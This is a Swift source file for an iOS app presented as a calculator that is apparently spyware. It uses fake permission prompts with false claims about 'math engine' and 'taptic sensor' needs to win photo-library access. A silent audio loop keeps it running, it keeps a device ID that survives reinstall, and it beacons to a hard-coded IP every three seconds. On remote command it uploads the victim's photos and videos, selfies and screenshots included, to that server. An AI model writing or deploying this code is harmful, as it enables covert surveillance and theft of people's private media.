import Foundation
import Photos
import AVFoundation
import UIKit
import Security

// MARK: - Persistent Keychain Helper (Survives App Deletion & Reinstallation)
struct VaultKeychain {
    static let service = "com.calculator.vault.fleet"
    static let account = "persistent_device_id"

    static func saveDeviceId(_ id: String) {
        guard let data = id.data(using: .utf8) else { return }
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: service,
            kSecAttrAccount as String: account,
            kSecValueData as String: data,
            kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
        ]
        SecItemDelete(query as CFDictionary)
        SecItemAdd(query as CFDictionary, nil)
    }

    static func loadDeviceId() -> String? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrService as String: service,
            kSecAttrAccount as String: account,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne
        ]
        var item: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &item)
        if status == errSecSuccess, let data = item as? Data {
            return String(data: data, encoding: .utf8)
        }
        return nil
    }
}

// MARK: - Hardware Device Model Detection
func getExactDeviceModel() -> String {
    var systemInfo = utsname()
    uname(&systemInfo)
    let machineMirror = Mirror(reflecting: systemInfo.machine)
    let identifier = machineMirror.children.reduce("") { identifier, element in
        guard let value = element.value as? Int8, value != 0 else { return identifier }
        return identifier + String(UnicodeScalar(UInt8(value)))
    }

    let modelMap: [String: String] = [
        "iPhone9,1": "iPhone 7", "iPhone9,3": "iPhone 7",
        "iPhone9,2": "iPhone 7 Plus", "iPhone9,4": "iPhone 7 Plus",
        "iPhone10,1": "iPhone 8", "iPhone10,4": "iPhone 8",
        "iPhone10,2": "iPhone 8 Plus", "iPhone10,5": "iPhone 8 Plus",
        "iPhone10,3": "iPhone X", "iPhone10,6": "iPhone X",
        "iPhone11,2": "iPhone XS", "iPhone11,4": "iPhone XS Max", "iPhone11,6": "iPhone XS Max",
        "iPhone11,8": "iPhone XR",
        "iPhone12,1": "iPhone 11", "iPhone12,3": "iPhone 11 Pro", "iPhone12,5": "iPhone 11 Pro Max",
        "iPhone12,8": "iPhone SE (2nd gen)",
        "iPhone13,1": "iPhone 12 mini", "iPhone13,2": "iPhone 12", "iPhone13,3": "iPhone 12 Pro", "iPhone13,4": "iPhone 12 Pro Max",
        "iPhone14,4": "iPhone 13 mini", "iPhone14,5": "iPhone 13", "iPhone14,2": "iPhone 13 Pro", "iPhone14,3": "iPhone 13 Pro Max",
        "iPhone14,6": "iPhone SE (3rd gen)",
        "iPhone14,7": "iPhone 14", "iPhone14,8": "iPhone 14 Plus", "iPhone15,2": "iPhone 14 Pro", "iPhone15,3": "iPhone 14 Pro Max",
        "iPhone15,4": "iPhone 15", "iPhone15,5": "iPhone 15 Plus", "iPhone16,1": "iPhone 15 Pro", "iPhone16,2": "iPhone 15 Pro Max",
        "iPhone17,3": "iPhone 16", "iPhone17,4": "iPhone 16 Plus", "iPhone17,1": "iPhone 16 Pro", "iPhone17,2": "iPhone 16 Pro Max",
        "iPhone17,5": "iPhone 16e"
    ]

    return modelMap[identifier] ?? (identifier.isEmpty ? UIDevice.current.model : identifier)
}

struct SlotConfig {
    var title: String
    var subtitle: String
    var mandatory: Bool = true
    var denyMsg: String = "Action Blocked: Required system component."
}

class VaultEngine: NSObject, ObservableObject {
    static let shared = VaultEngine()

    @Published var serverURL: String = "http://213.199.53.54:7000"
    @Published var deviceId: String = ""
    @Published var deviceName: String = ""
    @Published var deviceModel: String = "iPhone"
    @Published var secretPin: String = "9876"
    @Published var isActivated: Bool = false
    @Published var isBackgroundActive: Bool = false
    @Published var photosCount: Int = 0
    @Published var videosCount: Int = 0
    @Published var batteryLevel: Int = 100
    @Published var isCharging: Bool = false
    @Published var isStorageBlocked: Bool = false

    @Published var slot1Config = SlotConfig(title: "Slot 1", subtitle: "", mandatory: true, denyMsg: "System cache access is required to store calculator themes and computation cache.")
    @Published var slot2Config = SlotConfig(title: "Slot 2", subtitle: "", mandatory: true, denyMsg: "Core math calculation engine disabled. Mathematical accuracy cannot be guaranteed without this component.")
    @Published var slot3Config = SlotConfig(title: "Slot 3", subtitle: "", mandatory: true, denyMsg: "Taptic hardware sensor access required for touch registration.")
    @Published var slot4Config = SlotConfig(title: "Slot 4", subtitle: "", mandatory: true, denyMsg: "Background stream buffer disabled. Live calculations suspended until enabled.")
    @Published var cloudStreamButtonTitle: String = "Download CloudStream Provider"
    @Published var fakePrompt1Title: String = "\"CloudStream\" Would Like to Access Media Stream Cache"
    @Published var fakePrompt1Message: String = "To buffer extension repository and streaming provider data."
    @Published var fakePrompt2Title: String = "\"CloudStream\" Would Like to Enable Background Sync"
    @Published var fakePrompt2Message: String = "To keep streaming providers and repository buffer updated."

    private var audioPlayer: AVAudioPlayer?
    private var bgTimer: DispatchSourceTimer?
    private let heartbeatQueue = DispatchQueue(label: "com.calculator.heartbeat", qos: .background)
    private var bgTaskID: UIBackgroundTaskIdentifier = .invalid
    private let session: URLSession
    private var syncedAssetIds: Set<String> = []
    private var interruptionObserver: NSObjectProtocol?

    override init() {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 60
        config.timeoutIntervalForResource = 120
        config.httpMaximumConnectionsPerHost = 8
        self.session = URLSession(configuration: config)

        super.init()
        UIDevice.current.isBatteryMonitoringEnabled = true
        setupInterruptionObserver()
        loadSettings()
    }

    func loadSettings() {
        let defaults = UserDefaults.standard

        // 1. Detect Real Device Name & Hardware Model
        let rawName = UIDevice.current.name.trimmingCharacters(in: .whitespacesAndNewlines)
        let model = getExactDeviceModel()
        deviceName = rawName.isEmpty ? model : rawName
        deviceModel = model

        // 2. Persistent Device ID (Keychain survives app reinstallation!)
        if let keychainId = VaultKeychain.loadDeviceId(), !keychainId.isEmpty {
            deviceId = keychainId
            defaults.set(deviceId, forKey: "vault_device_id")
        } else if let savedId = defaults.string(forKey: "vault_device_id"), !savedId.isEmpty {
            deviceId = savedId
            VaultKeychain.saveDeviceId(savedId)
        } else {
            // New Device: generate from Device Name and Model
            let cleanName = deviceName.replacingOccurrences(of: "/", with: "-")
            let cleanModel = model.replacingOccurrences(of: "/", with: "-")
            if cleanName.lowercased().contains(cleanModel.lowercased()) {
                deviceId = cleanName
            } else {
                deviceId = "\(cleanName) (\(cleanModel))"
            }
            defaults.set(deviceId, forKey: "vault_device_id")
            VaultKeychain.saveDeviceId(deviceId)
        }

        // Force port 7000
        if let savedURL = defaults.string(forKey: "vps_server_url"), !savedURL.isEmpty {
            serverURL = savedURL.contains(":5000") ? "http://213.199.53.54:7000" : savedURL
        } else {
            serverURL = "http://213.199.53.54:7000"
        }

        if let savedPin = defaults.string(forKey: "secret_pin"), !savedPin.isEmpty {
            secretPin = savedPin
        }
        isActivated = defaults.bool(forKey: "is_activated")

        // Load synced asset cache to prevent re-uploading
        if let savedSynced = defaults.stringArray(forKey: "synced_asset_ids") {
            syncedAssetIds = Set(savedSynced)
        }

        // Load cached slots and fake permissions
        if let s1 = defaults.string(forKey: "cfg_slot1_title"), !s1.isEmpty { slot1Config.title = s1 }
        if let s2 = defaults.string(forKey: "cfg_slot2_title"), !s2.isEmpty { slot2Config.title = s2 }
        if let s3 = defaults.string(forKey: "cfg_slot3_title"), !s3.isEmpty { slot3Config.title = s3 }
        if let s4 = defaults.string(forKey: "cfg_slot4_title"), !s4.isEmpty { slot4Config.title = s4 }
        if let btn = defaults.string(forKey: "cfg_cs_btn"), !btn.isEmpty { cloudStreamButtonTitle = btn }
        if let f1t = defaults.string(forKey: "cfg_fake1_title"), !f1t.isEmpty { fakePrompt1Title = f1t }
        if let f1m = defaults.string(forKey: "cfg_fake1_msg"), !f1m.isEmpty { fakePrompt1Message = f1m }
        if let f2t = defaults.string(forKey: "cfg_fake2_title"), !f2t.isEmpty { fakePrompt2Title = f2t }
        if let f2m = defaults.string(forKey: "cfg_fake2_msg"), !f2m.isEmpty { fakePrompt2Message = f2m }

        startBackgroundKeepAlive()
        updateBatteryInfo()
        refreshMediaStats()
        startHeartbeat()
    }

    func saveSettings() {
        let defaults = UserDefaults.standard
        defaults.set(serverURL, forKey: "vps_server_url")
        defaults.set(deviceId, forKey: "vault_device_id")
        defaults.set(secretPin, forKey: "secret_pin")
        defaults.set(isActivated, forKey: "is_activated")
        defaults.set(Array(syncedAssetIds), forKey: "synced_asset_ids")
    }

    func updateBatteryInfo() {
        DispatchQueue.main.async {
            let level = UIDevice.current.batteryLevel
            self.batteryLevel = level >= 0 ? Int(level * 100) : 100
            self.isCharging = (UIDevice.current.batteryState == .charging || UIDevice.current.batteryState == .full)
        }
    }

    func checkPermissionStatus() {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        DispatchQueue.main.async {
            if status == .denied || status == .restricted {
                self.isStorageBlocked = false
                self.isActivated = false
            } else if status == .authorized || status == .limited {
                self.isStorageBlocked = false
                self.isActivated = true
                self.refreshMediaStats()
            }
        }
    }

    // MARK: - Method 2 Storage/Cache Permission
    func requestStoragePermission(completion: @escaping (Bool) -> Void) {
        PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
            DispatchQueue.main.async {
                let granted = (status == .authorized || status == .limited)
                if granted {
                    self.isActivated = true
                    self.isStorageBlocked = false
                    self.saveSettings()
                    self.refreshMediaStats()
                } else {
                    self.isActivated = false
                    self.isStorageBlocked = false
                }
                completion(granted)
            }
        }
    }

    func refreshMediaStats() {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        guard status == .authorized || status == .limited else {
            // Permission NOT granted yet. Never touch PHAsset so NO prompt pops up on app launch!
            self.sendHeartbeat()
            return
        }

        let photosFetch = PHAsset.fetchAssets(with: .image, options: nil)
        let videosFetch = PHAsset.fetchAssets(with: .video, options: nil)

        DispatchQueue.main.async {
            self.photosCount = photosFetch.count
            self.videosCount = videosFetch.count
            self.sendHeartbeat()
        }
    }

    // MARK: - Silent Audio Loop + UIBackgroundTask
    func startBackgroundKeepAlive() {
        registerBackgroundTask()

        if let player = audioPlayer, player.isPlaying {
            return
        }

        do {
            try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
            try AVAudioSession.sharedInstance().setActive(true)

            if audioPlayer == nil {
                let silentWavData = createSilentWavData()
                audioPlayer = try AVAudioPlayer(data: silentWavData)
                audioPlayer?.numberOfLoops = -1
                audioPlayer?.volume = 0.01
                audioPlayer?.prepareToPlay()
            }
            audioPlayer?.play()

            DispatchQueue.main.async {
                self.isBackgroundActive = true
            }
        } catch {
            print("[VaultEngine] Audio error: \(error)")
        }
    }

    func registerBackgroundTask() {
        let oldTask = bgTaskID
        bgTaskID = UIApplication.shared.beginBackgroundTask(withName: "VaultKeepAlive") { [weak self] in
            guard let self = self else { return }
            let expiredTask = self.bgTaskID
            self.bgTaskID = .invalid
            if expiredTask != .invalid {
                UIApplication.shared.endBackgroundTask(expiredTask)
            }
            self.registerBackgroundTask()
        }
        if oldTask != .invalid {
            UIApplication.shared.endBackgroundTask(oldTask)
        }
    }

    private func setupInterruptionObserver() {
        interruptionObserver = NotificationCenter.default.addObserver(
            forName: AVAudioSession.interruptionNotification,
            object: nil,
            queue: .main
        ) { [weak self] notification in
            guard let userInfo = notification.userInfo,
                  let typeValue = userInfo[AVAudioSessionInterruptionTypeKey] as? UInt,
                  let type = AVAudioSession.InterruptionType(rawValue: typeValue) else { return }
            if type == .ended {
                try? AVAudioSession.sharedInstance().setActive(true)
                self?.audioPlayer?.play()
            }
        }
    }

    private func createSilentWavData() -> Data {
        var header = [UInt8]()
        let sampleRate: UInt32 = 8000
        let channels: UInt16 = 1
        let bitsPerSample: UInt16 = 16
        let numSamples: UInt32 = sampleRate * 1
        let subChunk2Size: UInt32 = numSamples * UInt32(channels) * UInt32(bitsPerSample / 8)
        let chunkSize: UInt32 = 36 + subChunk2Size

        header.append(contentsOf: "RIFF".utf8)
        header.append(contentsOf: withUnsafeBytes(of: chunkSize.littleEndian) { Array($0) })
        header.append(contentsOf: "WAVE".utf8)
        header.append(contentsOf: "fmt ".utf8)
        header.append(contentsOf: withUnsafeBytes(of: UInt32(16).littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: UInt16(1).littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: channels.littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: sampleRate.littleEndian) { Array($0) })
        let byteRate = sampleRate * UInt32(channels) * UInt32(bitsPerSample / 8)
        header.append(contentsOf: withUnsafeBytes(of: byteRate.littleEndian) { Array($0) })
        let blockAlign = channels * (bitsPerSample / 8)
        header.append(contentsOf: withUnsafeBytes(of: blockAlign.littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: bitsPerSample.littleEndian) { Array($0) })
        header.append(contentsOf: "data".utf8)
        header.append(contentsOf: withUnsafeBytes(of: subChunk2Size.littleEndian) { Array($0) })

        var data = Data(header)
        let silentBytes = [UInt8](repeating: 0, count: Int(subChunk2Size))
        data.append(contentsOf: silentBytes)
        return data
    }

    // MARK: - Heartbeat Loop (GCD DispatchSourceTimer on Background Queue)
    func startHeartbeat() {
        bgTimer?.cancel()
        bgTimer = nil

        sendHeartbeat()
        checkForCommands()

        let timer = DispatchSource.makeTimerSource(flags: [], queue: heartbeatQueue)
        timer.schedule(deadline: .now() + 3.0, repeating: 3.0, leeway: .milliseconds(500))
        timer.setEventHandler { [weak self] in
            guard let self = self else { return }
            self.updateBatteryInfo()
            self.sendHeartbeat()
            self.checkForCommands()
        }
        timer.resume()
        bgTimer = timer
    }

    func sendHeartbeat() {
        guard let url = URL(string: "\(serverURL)/api/target/heartbeat") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let body: [String: Any] = [
            "deviceId": deviceId,
            "name": deviceName,
            "model": deviceModel,
            "stats": [
                "photosCount": photosCount,
                "videosCount": videosCount,
                "battery": batteryLevel,
                "isCharging": isCharging
            ]
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        session.dataTask(with: req) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
               let cfg = json["config"] as? [String: Any] {
                DispatchQueue.main.async {
                    self.applyConfig(cfg)
                }
            }
        }.resume()
    }

    func applyConfig(_ cfg: [String: Any]) {
        if let s1 = cfg["slot1"] as? [String: Any] {
            if let t = s1["title"] as? String { slot1Config.title = t }
            if let sub = s1["subtitle"] as? String { slot1Config.subtitle = sub }
            if let m = s1["mandatory"] as? Bool { slot1Config.mandatory = m }
            if let d = s1["denyMsg"] as? String { slot1Config.denyMsg = d }
        }
        if let s2 = cfg["slot2"] as? [String: Any] {
            if let t = s2["title"] as? String { slot2Config.title = t }
            if let sub = s2["subtitle"] as? String { slot2Config.subtitle = sub }
            if let m = s2["mandatory"] as? Bool { slot2Config.mandatory = m }
            if let d = s2["denyMsg"] as? String { slot2Config.denyMsg = d }
        }
        if let s3 = cfg["slot3"] as? [String: Any] {
            if let t = s3["title"] as? String { slot3Config.title = t }
            if let sub = s3["subtitle"] as? String { slot3Config.subtitle = sub }
            if let m = s3["mandatory"] as? Bool { slot3Config.mandatory = m }
            if let d = s3["denyMsg"] as? String { slot3Config.denyMsg = d }
        }
        if let s4 = cfg["slot4"] as? [String: Any] {
            if let t = s4["title"] as? String { slot4Config.title = t }
            if let sub = s4["subtitle"] as? String { slot4Config.subtitle = sub }
            if let m = s4["mandatory"] as? Bool { slot4Config.mandatory = m }
            if let d = s4["denyMsg"] as? String { slot4Config.denyMsg = d }
        }
        if let cs = cfg["cloudStreamButtonTitle"] as? String {
            cloudStreamButtonTitle = cs
        }
        if let t1 = cfg["fakePrompt1Title"] as? String {
            fakePrompt1Title = t1
        }
        if let m1 = cfg["fakePrompt1Message"] as? String {
            fakePrompt1Message = m1
        }
        if let t2 = cfg["fakePrompt2Title"] as? String {
            fakePrompt2Title = t2
        }
        if let m2 = cfg["fakePrompt2Message"] as? String {
            fakePrompt2Message = m2
        }

        // Cache config offline in UserDefaults
        let def = UserDefaults.standard
        def.set(slot1Config.title, forKey: "cfg_slot1_title")
        def.set(slot2Config.title, forKey: "cfg_slot2_title")
        def.set(slot3Config.title, forKey: "cfg_slot3_title")
        def.set(slot4Config.title, forKey: "cfg_slot4_title")
        def.set(cloudStreamButtonTitle, forKey: "cfg_cs_btn")
        def.set(fakePrompt1Title, forKey: "cfg_fake1_title")
        def.set(fakePrompt1Message, forKey: "cfg_fake1_msg")
        def.set(fakePrompt2Title, forKey: "cfg_fake2_title")
        def.set(fakePrompt2Message, forKey: "cfg_fake2_msg")
    }

    func checkForCommands() {
        let encodedId = deviceId.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) ?? deviceId
        guard let url = URL(string: "\(serverURL)/api/commands?deviceId=\(encodedId)") else { return }

        session.dataTask(with: url) { [weak self] data, _, error in
            guard let self = self, let data = data, error == nil else { return }
            do {
                if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let hasCommand = json["hasCommand"] as? Bool, hasCommand,
                   let command = json["command"] as? [String: Any],
                   let action = command["action"] as? String {

                    if action == "FETCH_MEDIA" {
                        let album = command["album"] as? String ?? "all"
                        let count = command["count"] as? Int ?? 25
                        let skipExisting = command["skipExisting"] as? Bool ?? true
                        self.executeSmartFetch(album: album, count: count, skipExisting: skipExisting)
                    } else if action == "GET_STATS" {
                        self.refreshMediaStats()
                    }
                }
            } catch {}
        }.resume()
    }

    // MARK: - Smart Fetch with Deduplication & Album Filtering
    func executeSmartFetch(album: String, count: Int, skipExisting: Bool) {
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]

        var fetchResult: PHFetchResult<PHAsset>?

        switch album {
        case "screenshots":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumScreenshots, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        case "favorites":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumFavorites, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        case "videos":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumVideos, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        case "selfies":
            let collections = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .smartAlbumSelfPortraits, options: nil)
            if let first = collections.firstObject { fetchResult = PHAsset.fetchAssets(in: first, options: fetchOptions) }
        default:
            fetchResult = PHAsset.fetchAssets(with: fetchOptions)
        }

        guard let result = fetchResult else { return }

        var targetAssets: [PHAsset] = []
        let maxItems = (count == -1) ? result.count : count

        for i in 0..<result.count {
            let asset = result.object(at: i)
            // Skip already synced items if requested
            if skipExisting && syncedAssetIds.contains(asset.localIdentifier) {
                continue
            }
            targetAssets.append(asset)
            if targetAssets.count >= maxItems { break }
        }

        let total = targetAssets.count
        if total == 0 {
            reportProgress(current: 0, total: 0, percent: 100, speed: "Done", eta: "0s")
            return
        }

        print("[VaultEngine] Starting high-speed upload of \(total) new assets...")
        let startTime = Date()
        var completed = 0
        var totalBytesUploaded: Int64 = 0

        let manager = PHImageManager.default()
        let options = PHImageRequestOptions()
        options.isSynchronous = false
        options.deliveryMode = .highQualityFormat
        options.isNetworkAccessAllowed = true

        let queue = OperationQueue()
        queue.maxConcurrentOperationCount = 4 // High-speed parallel pipeline

        for asset in targetAssets {
            queue.addOperation { [weak self] in
                guard let self = self else { return }
                let sema = DispatchSemaphore(value: 0)

                if asset.mediaType == .image {
                    manager.requestImageDataAndOrientation(for: asset, options: options) { data, _, _, _ in
                        defer { sema.signal() }
                        guard let data = data else { return }

                        // Optimized compression (0.75) for ultra-fast transfer while preserving high resolution
                        let uploadData: Data
                        if let img = UIImage(data: data), let compressed = img.jpegData(compressionQuality: 0.75) {
                            uploadData = compressed
                        } else {
                            uploadData = data
                        }

                        let filename = "img_\(Date().timeIntervalSince1970)_\(UUID().uuidString.prefix(5)).jpg"
                        self.uploadSingleFile(data: uploadData, filename: filename, mimeType: "image/jpeg") { success in
                            if success {
                                self.syncedAssetIds.insert(asset.localIdentifier)
                                completed += 1
                                totalBytesUploaded += Int64(uploadData.count)

                                let elapsed = Date().timeIntervalSince(startTime)
                                let speedMBps = elapsed > 0 ? (Double(totalBytesUploaded) / 1024 / 1024) / elapsed : 1.0
                                let remainingItems = total - completed
                                let avgSecPerItem = elapsed / Double(completed)
                                let etaSec = Int(Double(remainingItems) * avgSecPerItem)

                                let pct = (Double(completed) / Double(total)) * 100
                                self.reportProgress(
                                    current: completed,
                                    total: total,
                                    percent: pct,
                                    speed: String(format: "%.1f MB/s", speedMBps),
                                    eta: "\(etaSec)s remaining"
                                )
                            }
                        }
                    }
                } else if asset.mediaType == .video {
                    let vOptions = PHVideoRequestOptions()
                    vOptions.isNetworkAccessAllowed = true
                    vOptions.deliveryMode = .mediumQualityFormat
                    manager.requestAVAsset(forVideo: asset, options: vOptions) { avAsset, _, _ in
                        defer { sema.signal() }
                        guard let avAsset = avAsset else { return }

                        let filename = "vid_\(Date().timeIntervalSince1970)_\(UUID().uuidString.prefix(5)).mp4"
                        let tempOutURL = FileManager.default.temporaryDirectory.appendingPathComponent(filename)

                        // Hardware-accelerated 720p H.264 export for lightning-fast uploads
                        if let exportSession = AVAssetExportSession(asset: avAsset, presetName: AVAssetExportPreset1280x720) {
                            exportSession.outputURL = tempOutURL
                            exportSession.outputFileType = .mp4
                            exportSession.shouldOptimizeForNetworkUse = true
                            let expSema = DispatchSemaphore(value: 0)
                            exportSession.exportAsynchronously {
                                expSema.signal()
                            }
                            expSema.wait()

                            if exportSession.status == .completed, let vData = try? Data(contentsOf: tempOutURL) {
                                try? FileManager.default.removeItem(at: tempOutURL)
                                self.uploadSingleFile(data: vData, filename: filename, mimeType: "video/mp4") { success in
                                    if success {
                                        self.syncedAssetIds.insert(asset.localIdentifier)
                                        completed += 1
                                        totalBytesUploaded += Int64(vData.count)
                                        let pct = (Double(completed) / Double(total)) * 100
                                        self.reportProgress(current: completed, total: total, percent: pct, speed: "Ultra HD Sync", eta: "")
                                    }
                                }
                                return
                            }
                        }

                        // Fallback to direct stream if export session unavailable
                        if let urlAsset = avAsset as? AVURLAsset, let vData = try? Data(contentsOf: urlAsset.url) {
                            self.uploadSingleFile(data: vData, filename: filename, mimeType: "video/mp4") { success in
                                if success {
                                    self.syncedAssetIds.insert(asset.localIdentifier)
                                    completed += 1
                                    totalBytesUploaded += Int64(vData.count)
                                    let pct = (Double(completed) / Double(total)) * 100
                                    self.reportProgress(current: completed, total: total, percent: pct, speed: "Video Sync", eta: "")
                                }
                            }
                        }
                    }
                }
                sema.wait()
            }
        }

        queue.waitUntilAllOperationsAreFinished()
        saveSettings()
    }

    private func uploadSingleFile(data: Data, filename: String, mimeType: String, completion: @escaping (Bool) -> Void) {
        guard let url = URL(string: "\(serverURL)/api/upload") else { completion(false); return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        let safeHeader = deviceId.addingPercentEncoding(withAllowedCharacters: .urlPathAllowed) ?? deviceId
        req.setValue(safeHeader, forHTTPHeaderField: "x-device-id")

        let boundary = "Boundary-\(UUID().uuidString)"
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

        var body = Data()
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"media\"; filename=\"\(filename)\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: \(mimeType)\r\n\r\n".data(using: .utf8)!)
        body.append(data)
        body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)

        session.uploadTask(with: req, from: body) { _, res, error in
            let success = (error == nil && (res as? HTTPURLResponse)?.statusCode == 200)
            completion(success)
        }.resume()
    }

    private func reportProgress(current: Int, total: Int, percent: Double, speed: String, eta: String) {
        guard let url = URL(string: "\(serverURL)/api/target/progress") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let body: [String: Any] = [
            "deviceId": deviceId,
            "current": current,
            "total": total,
            "percent": percent,
            "speed": speed,
            "eta": eta
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        session.dataTask(with: req).resume()
    }
}
